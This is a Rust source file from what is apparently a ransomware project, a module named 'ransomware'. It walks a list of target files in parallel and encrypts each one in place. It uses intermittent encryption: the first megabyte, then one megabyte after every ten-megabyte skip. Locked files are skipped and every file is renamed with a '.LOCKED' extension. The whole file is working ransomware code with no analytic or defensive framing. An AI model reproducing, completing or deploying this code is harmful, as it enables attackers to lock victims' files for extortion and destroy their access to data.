use rayon::prelude::*;
use std::fs::{self, File};
use std::io::{Read, Write, Seek, SeekFrom};
use std::path::Path;
use crate::modules::ransomware::crypto::RansomCrypto;
use std::sync::Arc;

pub fn encrypt_all(targets: Vec<std::path::PathBuf>, crypto: RansomCrypto) {
    let crypto = Arc::new(crypto);
    
    // Parallel processing
    targets.par_iter().for_each(|path| {
        if let Err(e) = encrypt_file(path, &crypto) {
            println!("Failed to encrypt {:?}: {}", path, e);
        }
    });
}

fn encrypt_file(path: &Path, crypto: &RansomCrypto) -> std::io::Result<()> {
    let mut file = match std::fs::OpenOptions::new().read(true).write(true).open(path) {
        Ok(f) => f,
        Err(_) => return Ok(()), // Skip locked files
    };

    let len = file.metadata()?.len();
    
    // Intermittent Encryption Strategy
    // 1. Encrypt first 1MB (Header)
    let header_size = 1024 * 1024; // 1MB
    if len > 0 {
        let chunk_size = std::cmp::min(len as usize, header_size);
        let mut buffer = vec![0u8; chunk_size];
        
        file.seek(SeekFrom::Start(0))?;
        file.read_exact(&mut buffer)?;
        
        let encrypted = crypto.encrypt_file_content(&buffer);
        
        file.seek(SeekFrom::Start(0))?;
        file.write_all(&encrypted)?;
    }
    
    // 2. Encrypt chunks every 10MB if file is large
    // Logic: Skip 10MB, Encrypt 1MB, Repeat.
    let step = 10 * 1024 * 1024; // 10MB
    let mut pos = header_size as u64;
    
    while pos < len {
        // Skip
        pos += step;
        if pos >= len { break; }
        
        // Encrypt logic...
        file.seek(SeekFrom::Start(pos))?;
        let mut buffer = vec![0u8; header_size]; // 1MB chunk
        let bytes_read = file.read(&mut buffer)?;
        if bytes_read == 0 { break; }
        
        // Truncate buffer to actual read
        buffer.truncate(bytes_read);
        
        let encrypted = crypto.encrypt_file_content(&buffer);
        
        file.seek(SeekFrom::Start(pos))?;
        file.write_all(&encrypted)?;
        
        pos += header_size as u64;
    }

    // Rename
    let new_path = format!("{}.LOCKED", path.to_string_lossy());
    let _ = fs::rename(path, new_path);

    Ok(())
}
